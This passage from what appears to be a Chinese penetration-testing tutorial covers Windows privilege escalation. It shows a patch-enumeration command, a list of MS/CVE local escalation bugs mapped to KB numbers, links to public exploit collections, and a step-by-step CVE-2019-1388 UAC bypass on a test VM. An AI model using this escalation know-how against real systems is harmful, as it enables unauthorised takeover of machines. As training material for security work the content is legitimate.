KB3134228 KB3143141 KB3141780 <span class="token punctuation">)</span> <span class="token keyword">do</span> @type micropoor<span class="token punctuation">.</span>txt<span class="token operator">|</span>@find <span class="token operator">/</span>i
<span class="token string">"%i"</span><span class="token operator">||</span> @echo <span class="token operator">%</span>i you can fuck<span class="token punctuation">)</span><span class="token operator">&amp;</span>del <span class="token operator">/</span>f <span class="token operator">/</span>q <span class="token operator">/</span>a micropoor<span class="token punctuation">.</span>txt
</code></pre>
<p>注：以上需要在可写目录执行。需要临时生成micrpoor.txt，以上补丁编号请根据环境来增删</p>
<hr>
<p><strong>示例</strong></p>
<p>一般实战中在类似 tmp 目录等可写目录下执行：C:\tmp&gt;</p>
<p>以 11-080 为例：<br>
<img src="https://img-blog.csdnimg.cn/2020100421042598.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201004210430258.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201004210436910.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<hr>
<p><strong>exp注：</strong></p>
<pre><code class="prism language-c">MS17<span class="token operator">-</span><span class="token number">017</span> <span class="token punctuation">[</span>KB4013081<span class="token punctuation">]</span> <span class="token punctuation">[</span>GDI Palette Objects Local Privilege Escalation<span class="token punctuation">]</span> <span class="token punctuation">(</span>windows <span class="token number">7</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span>
CVE<span class="token operator">-</span><span class="token number">2017</span><span class="token operator">-</span><span class="token number">8464</span> <span class="token punctuation">[</span>LNK Remote Code Execution Vulnerability<span class="token punctuation">]</span> <span class="token punctuation">(</span>windows <span class="token number">10</span><span class="token operator">/</span><span class="token number">8.1</span><span class="token operator">/</span><span class="token number">7</span><span class="token operator">/</span><span class="token number">2016</span><span class="token operator">/</span><span class="token number">2010</span><span class="token operator">/</span><span class="token number">2008</span>）
CVE<span class="token operator">-</span><span class="token number">2017</span><span class="token operator">-</span><span class="token number">0213</span> <span class="token punctuation">[</span>Windows COM Elevation of Privilege Vulnerability<span class="token punctuation">]</span> <span class="token punctuation">(</span>windows <span class="token number">10</span><span class="token operator">/</span><span class="token number">8.1</span><span class="token operator">/</span><span class="token number">7</span><span class="token operator">/</span><span class="token number">2016</span><span class="token operator">/</span><span class="token number">2010</span><span class="token operator">/</span><span class="token number">2008</span><span class="token punctuation">)</span>
MS17<span class="token operator">-</span><span class="token number">010</span> <span class="token punctuation">[</span>KB4013389<span class="token punctuation">]</span> <span class="token punctuation">[</span>Windows Kernel Mode Drivers<span class="token punctuation">]</span><span class="token punctuation">(</span>windows <span class="token number">7</span><span class="token operator">/</span><span class="token number">2008</span><span class="token operator">/</span><span class="token number">2003</span><span class="token operator">/</span>XP<span class="token punctuation">)</span>
MS16<span class="token operator">-</span><span class="token number">135</span> <span class="token punctuation">[</span>KB3199135<span class="token punctuation">]</span> <span class="token punctuation">[</span>Windows Kernel Mode Drivers<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2016</span><span class="token punctuation">)</span>
MS16<span class="token operator">-</span><span class="token number">111</span> <span class="token punctuation">[</span>KB3186973<span class="token punctuation">]</span> <span class="token punctuation">[</span>kernel api<span class="token punctuation">]</span> <span class="token punctuation">(</span>Windows <span class="token number">10</span> <span class="token number">10586</span> <span class="token punctuation">(</span><span class="token number">32</span><span class="token operator">/</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">8.1</span><span class="token punctuation">)</span>
MS16<span class="token operator">-</span><span class="token number">098</span> <span class="token punctuation">[</span>KB3178466<span class="token punctuation">]</span> <span class="token punctuation">[</span>Kernel Driver<span class="token punctuation">]</span> <span class="token punctuation">(</span>Win <span class="token number">8.1</span><span class="token punctuation">)</span>
MS16<span class="token operator">-</span><span class="token number">075</span> <span class="token punctuation">[</span>KB3164038<span class="token punctuation">]</span> <span class="token punctuation">[</span>Hot Potato<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2003</span><span class="token operator">/</span><span class="token number">2008</span><span class="token operator">/</span><span class="token number">7</span><span class="token operator">/</span><span class="token number">8</span><span class="token operator">/</span><span class="token number">2012</span><span class="token punctuation">)</span>
MS16<span class="token operator">-</span><span class="token number">034</span> <span class="token punctuation">[</span>KB3143145<span class="token punctuation">]</span> <span class="token punctuation">[</span>Kernel Driver<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2008</span><span class="token operator">/</span><span class="token number">7</span><span class="token operator">/</span><span class="token number">8</span><span class="token operator">/</span><span class="token number">10</span><span class="token operator">/</span><span class="token number">2012</span><span class="token punctuation">)</span>
MS16<span class="token operator">-</span><span class="token number">032</span> <span class="token punctuation">[</span>KB3143141<span class="token punctuation">]</span> <span class="token punctuation">[</span>Secondary Logon Handle<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2008</span><span class="token operator">/</span><span class="token number">7</span><span class="token operator">/</span><span class="token number">8</span><span class="token operator">/</span><span class="token number">10</span><span class="token operator">/</span><span class="token number">2012</span><span class="token punctuation">)</span>
MS16<span class="token operator">-</span><span class="token number">016</span> <span class="token punctuation">[</span>KB3136041<span class="token punctuation">]</span> <span class="token punctuation">[</span>WebDAV<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2008</span><span class="token operator">/</span>Vista<span class="token operator">/</span><span class="token number">7</span><span class="token punctuation">)</span>
MS15<span class="token operator">-</span><span class="token number">097</span> <span class="token punctuation">[</span>KB3089656<span class="token punctuation">]</span> <span class="token punctuation">[</span>remote code execution<span class="token punctuation">]</span> <span class="token punctuation">(</span>win8<span class="token punctuation">.</span><span class="token number">1</span><span class="token operator">/</span><span class="token number">2012</span><span class="token punctuation">)</span>
MS15<span class="token operator">-</span><span class="token number">076</span> <span class="token punctuation">[</span>KB3067505<span class="token punctuation">]</span> <span class="token punctuation">[</span>RPC<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2003</span><span class="token operator">/</span><span class="token number">2008</span><span class="token operator">/</span><span class="token number">7</span><span class="token operator">/</span><span class="token number">8</span><span class="token operator">/</span><span class="token number">2012</span><span class="token punctuation">)</span>
MS15<span class="token operator">-</span><span class="token number">077</span> <span class="token punctuation">[</span>KB3077657<span class="token punctuation">]</span> <span class="token punctuation">[</span>ATM<span class="token punctuation">]</span> <span class="token punctuation">(</span>XP<span class="token operator">/</span>Vista<span class="token operator">/</span>Win7<span class="token operator">/</span>Win8<span class="token operator">/</span><span class="token number">2000</span><span class="token operator">/</span><span class="token number">2003</span><span class="token operator">/</span><span class="token number">2008</span><span class="token operator">/</span><span class="token number">2012</span><span class="token punctuation">)</span>
MS15<span class="token operator">-</span><span class="token number">061</span> <span class="token punctuation">[</span>KB3057839<span class="token punctuation">]</span> <span class="token punctuation">[</span>Kernel Driver<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2003</span><span class="token operator">/</span><span class="token number">2008</span><span class="token operator">/</span><span class="token number">7</span><span class="token operator">/</span><span class="token number">8</span><span class="token operator">/</span><span class="token number">2012</span><span class="token punctuation">)</span>
MS15<span class="token operator">-</span><span class="token number">051</span> <span class="token punctuation">[</span>KB3057191<span class="token punctuation">]</span> <span class="token punctuation">[</span>Windows Kernel Mode Drivers<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2003</span><span class="token operator">/</span><span class="token number">2008</span><span class="token operator">/</span><span class="token number">7</span><span class="token operator">/</span><span class="token number">8</span><span class="token operator">/</span><span class="token number">2012</span><span class="token punctuation">)</span>
MS15<span class="token operator">-</span><span class="token number">010</span> <span class="token punctuation">[</span>KB3036220<span class="token punctuation">]</span> <span class="token punctuation">[</span>Kernel Driver<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2003</span><span class="token operator">/</span><span class="token number">2008</span><span class="token operator">/</span><span class="token number">7</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span>
MS15<span class="token operator">-</span><span class="token number">015</span> <span class="token punctuation">[</span>KB3031432<span class="token punctuation">]</span> <span class="token punctuation">[</span>Kernel Driver<span class="token punctuation">]</span> <span class="token punctuation">(</span>Win7<span class="token operator">/</span><span class="token number">8</span><span class="token operator">/</span><span class="token number">8.1</span><span class="token operator">/</span><span class="token number">2012</span><span class="token operator">/</span>RT<span class="token operator">/</span><span class="token number">2012</span> R2<span class="token operator">/</span><span class="token number">2008</span> R2<span class="token punctuation">)</span>
MS15<span class="token operator">-</span><span class="token number">001</span> <span class="token punctuation">[</span>KB3023266<span class="token punctuation">]</span> <span class="token punctuation">[</span>Kernel Driver<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2008</span><span class="token operator">/</span><span class="token number">2012</span><span class="token operator">/</span><span class="token number">7</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span>
MS14<span class="token operator">-</span><span class="token number">070</span> <span class="token punctuation">[</span>KB2989935<span class="token punctuation">]</span> <span class="token punctuation">[</span>Kernel Driver<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2003</span><span class="token punctuation">)</span>
MS14<span class="token operator">-</span><span class="token number">068</span> <span class="token punctuation">[</span>KB3011780<span class="token punctuation">]</span> <span class="token punctuation">[</span>Domain Privilege Escalation<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2003</span><span class="token operator">/</span><span class="token number">2008</span><span class="token operator">/</span><span class="token number">2012</span><span class="token operator">/</span><span class="token number">7</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span>
MS14<span class="token operator">-</span><span class="token number">058</span> <span class="token punctuation">[</span>KB3000061<span class="token punctuation">]</span> <span class="token punctuation">[</span>Win32k<span class="token punctuation">.</span>sys<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2003</span><span class="token operator">/</span><span class="token number">2008</span><span class="token operator">/</span><span class="token number">2012</span><span class="token operator">/</span><span class="token number">7</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span>
MS14<span class="token operator">-</span><span class="token number">040</span> <span class="token punctuation">[</span>KB2975684<span class="token punctuation">]</span> <span class="token punctuation">[</span>AFD Driver<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2003</span><span class="token operator">/</span><span class="token number">2008</span><span class="token operator">/</span><span class="token number">2012</span><span class="token operator">/</span><span class="token number">7</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span>
MS14<span class="token operator">-</span><span class="token number">002</span> <span class="token punctuation">[</span>KB2914368<span class="token punctuation">]</span> <span class="token punctuation">[</span>NDProxy<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2003</span><span class="token operator">/</span>XP<span class="token punctuation">)</span>
MS13<span class="token operator">-</span><span class="token number">053</span> <span class="token punctuation">[</span>KB2850851<span class="token punctuation">]</span> <span class="token punctuation">[</span>win32k<span class="token punctuation">.</span>sys<span class="token punctuation">]</span> <span class="token punctuation">(</span>XP<span class="token operator">/</span>Vista<span class="token operator">/</span><span class="token number">2003</span><span class="token operator">/</span><span class="token number">2008</span><span class="token operator">/</span>win <span class="token number">7</span><span class="token punctuation">)</span>
MS13<span class="token operator">-</span><span class="token number">046</span> <span class="token punctuation">[</span>KB2840221<span class="token punctuation">]</span> <span class="token punctuation">[</span>dxgkrnl<span class="token punctuation">.</span>sys<span class="token punctuation">]</span> <span class="token punctuation">(</span>Vista<span class="token operator">/</span><span class="token number">2003</span><span class="token operator">/</span><span class="token number">2008</span><span class="token operator">/</span><span class="token number">2012</span><span class="token operator">/</span><span class="token number">7</span><span class="token punctuation">)</span>
MS13<span class="token operator">-</span><span class="token number">005</span> <span class="token punctuation">[</span>KB2778930<span class="token punctuation">]</span> <span class="token punctuation">[</span>Kernel Mode Driver<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2003</span><span class="token operator">/</span><span class="token number">2008</span><span class="token operator">/</span><span class="token number">2012</span><span class="token operator">/</span>win7<span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span>
MS12<span class="token operator">-</span><span class="token number">042</span> <span class="token punctuation">[</span>KB2972621<span class="token punctuation">]</span> <span class="token punctuation">[</span>Service Bus<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2008</span><span class="token operator">/</span><span class="token number">2012</span><span class="token operator">/</span>win7<span class="token punctuation">)</span>
MS12<span class="token operator">-</span><span class="token number">020</span> <span class="token punctuation">[</span>KB2671387<span class="token punctuation">]</span> <span class="token punctuation">[</span>RDP<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2003</span><span class="token operator">/</span><span class="token number">2008</span><span class="token operator">/</span><span class="token number">7</span><span class="token operator">/</span>XP<span class="token punctuation">)</span>
MS11<span class="token operator">-</span><span class="token number">080</span> <span class="token punctuation">[</span>KB2592799<span class="token punctuation">]</span> <span class="token punctuation">[</span>AFD<span class="token punctuation">.</span>sys<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2003</span><span class="token operator">/</span>XP<span class="token punctuation">)</span>
MS11<span class="token operator">-</span><span class="token number">062</span> <span class="token punctuation">[</span>KB2566454<span class="token punctuation">]</span> <span class="token punctuation">[</span>NDISTAPI<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2003</span><span class="token operator">/</span>XP<span class="token punctuation">)</span>
MS11<span class="token operator">-</span><span class="token number">046</span> <span class="token punctuation">[</span>KB2503665<span class="token punctuation">]</span> <span class="token punctuation">[</span>AFD<span class="token punctuation">.</span>sys<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2003</span><span class="token operator">/</span><span class="token number">2008</span><span class="token operator">/</span><span class="token number">7</span><span class="token operator">/</span>XP<span class="token punctuation">)</span>
MS11<span class="token operator">-</span><span class="token number">011</span> <span class="token punctuation">[</span>KB2393802<span class="token punctuation">]</span> <span class="token punctuation">[</span>kernel Driver<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2003</span><span class="token operator">/</span><span class="token number">2008</span><span class="token operator">/</span><span class="token number">7</span><span class="token operator">/</span>XP<span class="token operator">/</span>Vista<span class="token punctuation">)</span>
MS10<span class="token operator">-</span><span class="token number">092</span> <span class="token punctuation">[</span>KB2305420<span class="token punctuation">]</span> <span class="token punctuation">[</span>Task Scheduler<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2008</span><span class="token operator">/</span><span class="token number">7</span><span class="token punctuation">)</span>
MS10<span class="token operator">-</span><span class="token number">065</span> <span class="token punctuation">[</span>KB2267960<span class="token punctuation">]</span> <span class="token punctuation">[</span>FastCGI<span class="token punctuation">]</span> <span class="token punctuation">(</span>IIS <span class="token number">5.1</span><span class="token punctuation">,</span> <span class="token number">6.0</span><span class="token punctuation">,</span> <span class="token number">7.0</span><span class="token punctuation">,</span> and <span class="token number">7.5</span><span class="token punctuation">)</span>
MS10<span class="token operator">-</span><span class="token number">059</span> <span class="token punctuation">[</span>KB982799<span class="token punctuation">]</span> <span class="token punctuation">[</span>ACL<span class="token operator">-</span>Churraskito<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2008</span><span class="token operator">/</span><span class="token number">7</span><span class="token operator">/</span>Vista<span class="token punctuation">)</span>
MS10<span class="token operator">-</span><span class="token number">048</span> <span class="token punctuation">[</span>KB2160329<span class="token punctuation">]</span> <span class="token punctuation">[</span>win32k<span class="token punctuation">.</span>sys<span class="token punctuation">]</span> <span class="token punctuation">(</span>XP SP2 <span class="token operator">&amp;</span> SP3<span class="token operator">/</span><span class="token number">2003</span> SP2<span class="token operator">/</span>Vista SP1 <span class="token operator">&amp;</span> SP2<span class="token operator">/</span><span class="token number">2008</span> Gold <span class="token operator">&amp;</span> SP2 <span class="token operator">&amp;</span> R2<span class="token operator">/</span>Win7<span class="token punctuation">)</span>
MS10<span class="token operator">-</span><span class="token number">015</span> <span class="token punctuation">[</span>KB977165<span class="token punctuation">]</span> <span class="token punctuation">[</span>KiTrap0D<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2003</span><span class="token operator">/</span><span class="token number">2008</span><span class="token operator">/</span><span class="token number">7</span><span class="token operator">/</span>XP<span class="token punctuation">)</span>
MS10<span class="token operator">-</span><span class="token number">012</span> <span class="token punctuation">[</span>KB971468<span class="token punctuation">]</span> <span class="token punctuation">[</span>SMB Client Trans2 stack overflow<span class="token punctuation">]</span> <span class="token punctuation">(</span>Windows <span class="token number">7</span><span class="token operator">/</span><span class="token number">2008</span>R2<span class="token punctuation">)</span>
MS09<span class="token operator">-</span><span class="token number">050</span> <span class="token punctuation">[</span>KB975517<span class="token punctuation">]</span><span class="token punctuation">[</span>Remote Code Execution<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2008</span><span class="token operator">/</span>Vista<span class="token punctuation">)</span>
MS09<span class="token operator">-</span><span class="token number">020</span> <span class="token punctuation">[</span>KB970483<span class="token punctuation">]</span> <span class="token punctuation">[</span>IIS <span class="token number">6.0</span><span class="token punctuation">]</span> <span class="token punctuation">(</span>IIS <span class="token number">5.1</span> and <span class="token number">6.0</span><span class="token punctuation">)</span>
MS09<span class="token operator">-</span><span class="token number">012</span> <span class="token punctuation">[</span>KB959454<span class="token punctuation">]</span> <span class="token punctuation">[</span>Chimichurri<span class="token punctuation">]</span> <span class="token punctuation">(</span>Vista<span class="token operator">/</span>win7<span class="token operator">/</span><span class="token number">2008</span><span class="token operator">/</span>Vista<span class="token punctuation">)</span>
MS08<span class="token operator">-</span><span class="token number">068</span> <span class="token punctuation">[</span>KB957097<span class="token punctuation">]</span> <span class="token punctuation">[</span>Remote Code Execution<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2000</span><span class="token operator">/</span>XP<span class="token punctuation">)</span>
MS08<span class="token operator">-</span><span class="token number">067</span> <span class="token punctuation">[</span>KB958644<span class="token punctuation">]</span> <span class="token punctuation">[</span>Remote Code Execution<span class="token punctuation">]</span> <span class="token punctuation">(</span>Windows <span class="token number">2000</span><span class="token operator">/</span>XP<span class="token operator">/</span>Server <span class="token number">2003</span><span class="token operator">/</span>Vista<span class="token operator">/</span>Server <span class="token number">2008</span><span class="token punctuation">)</span>
MS08<span class="token operator">-</span><span class="token number">066</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">(</span>Windows <span class="token number">2000</span><span class="token operator">/</span>XP<span class="token operator">/</span>Server <span class="token number">2003</span><span class="token punctuation">)</span>
MS08<span class="token operator">-</span><span class="token number">025</span> <span class="token punctuation">[</span>KB941693<span class="token punctuation">]</span> <span class="token punctuation">[</span>Win32<span class="token punctuation">.</span>sys<span class="token punctuation">]</span> <span class="token punctuation">(</span>XP<span class="token operator">/</span><span class="token number">2003</span><span class="token operator">/</span><span class="token number">2008</span><span class="token operator">/</span>Vista<span class="token punctuation">)</span>
MS06<span class="token operator">-</span><span class="token number">040</span> <span class="token punctuation">[</span>KB921883<span class="token punctuation">]</span> <span class="token punctuation">[</span>Remote Code Execution<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2003</span><span class="token operator">/</span>xp<span class="token operator">/</span><span class="token number">2000</span><span class="token punctuation">)</span>
MS05<span class="token operator">-</span><span class="token number">039</span> <span class="token punctuation">[</span>KB899588<span class="token punctuation">]</span> <span class="token punctuation">[</span>PnP Service<span class="token punctuation">]</span> <span class="token punctuation">(</span>Win <span class="token number">9</span>X<span class="token operator">/</span>ME<span class="token operator">/</span>NT<span class="token operator">/</span><span class="token number">2000</span><span class="token operator">/</span>XP<span class="token operator">/</span><span class="token number">2003</span><span class="token punctuation">)</span>
MS03<span class="token operator">-</span><span class="token number">026</span> <span class="token punctuation">[</span>KB823980<span class="token punctuation">]</span> <span class="token punctuation">[</span>Buffer Overrun In RPC Interface<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token operator">/</span>NT<span class="token operator">/</span><span class="token number">2000</span><span class="token operator">/</span>XP<span class="token operator">/</span><span class="token number">2003</span><span class="token punctuation">)</span>
</code></pre>
<p><strong>已对外公开exp注：</strong></p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>SecWiki<span class="token operator">/</span>windows<span class="token operator">-</span>kernel<span class="token operator">-</span>exploits
https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>WindowsExploits<span class="token operator">/</span>Exploits
https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>AusJock<span class="token operator">/</span>Privilege<span class="token operator">-</span>Escalation
</code></pre>
<hr>
<h2><a id="6122_Token_3811"></a>6.1.2.2 Token窃取与利用</h2>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">3</span>gstudent<span class="token punctuation">.</span>github<span class="token punctuation">.</span>io<span class="token operator">/</span><span class="token number">3</span>gstudent<span class="token punctuation">.</span>github<span class="token punctuation">.</span>io<span class="token operator">/</span>渗透技巧<span class="token operator">-</span>Token窃取与利用<span class="token operator">/</span>

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>xianfish<span class="token punctuation">.</span>xyz<span class="token operator">/</span><span class="token number">2020</span><span class="token operator">/</span><span class="token number">01</span><span class="token operator">/</span><span class="token number">04</span><span class="token operator">/</span>Token窃取与利用<span class="token operator">/</span>

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>edu<span class="token punctuation">.</span>heibai<span class="token punctuation">.</span>org<span class="token operator">/</span>Micro8<span class="token operator">-</span>渗透沉思录<span class="token operator">/</span>第一百一十课：窃取<span class="token punctuation">,</span>伪造模拟各种windows访问令牌<span class="token punctuation">[</span>token利用<span class="token punctuation">]</span><span class="token punctuation">.</span>pdf

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>gogs<span class="token punctuation">.</span>coooool<span class="token punctuation">.</span>club<span class="token operator">/</span>jee<span class="token operator">/</span>MICRO<span class="token operator">/</span>src<span class="token operator">/</span><span class="token number">573628</span>d1dd817622347dfab242af55bdebfd586b<span class="token operator">/</span>第一百一十课：窃取<span class="token punctuation">,</span>伪造模拟各种windows访问令牌<span class="token punctuation">[</span>token利用<span class="token punctuation">]</span><span class="token punctuation">.</span>pdf
</code></pre>
<p>看完这四个文章，在复现下期中的一些原理，就摸透了Token窃取与利用！！！</p>
<hr>
<h2><a id="6123_CVE20191388_Windows_UAC__3825"></a>6.1.2.3 CVE2019-1388 Windows UAC 提权漏洞</h2>
<p><strong>1、漏洞简述</strong></p>
<p>该漏洞位于Windows的UAC（User Account Control，用户账户控制）机制中。默认情况下，Windows会在一个单独的桌面上显示所有的UAC提示——Secure Desktop。这些提示是由名为consent.exe的可执行文件产生的，该可执行文件以NT AUTHORITY\SYSTEM权限运行，完整性级别为System。因为用户可以与该UI交互，因此对UI来说紧限制是必须的。否则，低权限的用户可能可以通过UI操作的循环路由以SYSTEM权限执行操作。即使隔离状态的看似无害的UI特征都可能会成为引发任意控制的动作链的第一步。事实上，UAC会话中含有尽可能少的点击操作选项。</p>
<p>利用程序：<code>https://github.com/jas502n/CVE-2019-1388</code></p>
<p><strong>2、影响范围</strong><br>
windows server 2019,2016,2012,2008,2008 R2<br>
windows7,8.1,10</p>
<p><strong>3、漏洞复现</strong></p>
<p>本次复现版本是win7虚拟机</p>
<p>查看是否打了补丁</p>
<pre><code class="prism language-c">systeminfo<span class="token operator">&gt;</span>snowming<span class="token punctuation">.</span>txt<span class="token operator">&amp;</span><span class="token punctuation">(</span><span class="token keyword">for</span> <span class="token operator">%</span>i in <span class="token punctuation">(</span>KB4525235 KB4525233<span class="token punctuation">)</span> <span class="token keyword">do</span> @type snowming<span class="token punctuation">.</span>txt<span class="token operator">|</span>@find <span class="token operator">/</span>i  <span class="token string">"%i"</span><span class="token operator">||</span> @echo  no this padding<span class="token punctuation">:</span> <span class="token operator">%</span>i<span class="token punctuation">)</span><span class="token operator">&amp;</span>del <span class="token operator">/</span>f <span class="token operator">/</span>q <span class="token operator">/</span>a snowming<span class="token punctuation">.</span>txt
</code></pre>
<p>将下载的程序放到win7虚拟机<br>
<img src="https://img-blog.csdnimg.cn/20201004215914686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
以管理员身份运行该文件<br>
<img src="https://img-blog.csdnimg.cn/202010042159278.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201004215933294.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
点击颁发者右边的超链接，然后ie就是启动打开链接<img src="https://img-blog.csdnimg.cn/20201004215951934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
此时，该网页以system权限运行<br>
<img src="https://img-blog.csdnimg.cn/20201004220002536.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
点击页面另存为<br>
<img src="https://img-blog.csdnimg.cn/20201004220012691.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
此时已经获取权限了</p>
<p>修改存放文件名，匹配system32下的文件，输入<code>C:\Windows\System32\*.*</code><br>
<img src="https://img-blog.csdnimg.cn/20201004220027679.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
右击打开cmd，使用whoami查看当前权限<br>
<img src="https://img-blog.csdnimg.cn/20201004220039123.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>修复方案：</strong></p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>portal<span class="token punctuation">.</span>msrc<span class="token punctuation">.</span>microsoft<span class="token punctuation">.</span>com<span class="token operator">/</span>en<span class="token operator">-</span>US<span class="token operator">/</span>security<span class="token operator">-</span>guidance<span class="token operator">/</span>advisory<span class="token operator">/</span>CVE<span class="token operator">-</span><span class="token number">2019</span><span class="token operator">-</span><span class="token number">1388</span>
</code></pre>
<p><strong>参考链接：</strong></p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>ajsafe<span class="token punctuation">.</span>com<span class="token operator">/</span>news<span class="token operator">/</span><span class="token number">58.</span>html

http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>blog<span class="token punctuation">.</span>leanote<span class="token punctuation">.</span>com<span class="token operator">/</span>post<span class="token operator">/</span>snowming<span class="token operator">/</span><span class="token number">38069f</span><span class="token number">423</span>c76

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>portal<span class="token punctuation">.</span>msrc<span class="token punctuation">.</span>microsoft<span class="token punctuation">.</span>com<span class="token operator">/</span>en<span class="token operator">-</span>US<span class="token operator">/</span>security<span class="token operator">-</span>guidance<span class="token operator">/</span>advisory<span class="token operator">/</span>CVE<span class="token operator">-</span><span class="token number">2019</span><span class="token operator">-</span><span class="token number">1388</span>
</code></pre>
<p>复现有太多文章了，这里是经典的！！</p>
<hr>
<h2><a id="613__3880"></a>6.1.3 第三方组件提权</h2>
<p><strong>1、漏洞介绍</strong></p>
<p>某些程序使用root权限启动，如果第三方服务或者程序存在漏洞或者配置问题，可以被利用来获得root权限。</p>
<p><strong>2、漏洞复现</strong></p>
<p>如下图以tmux为例，通过查看进程，发现tmux以root权限启动。</p>
<p>(tmux是一个终端多路复用器：它使从单个屏幕创建，访问和控制多个终端成为可能。)</p>
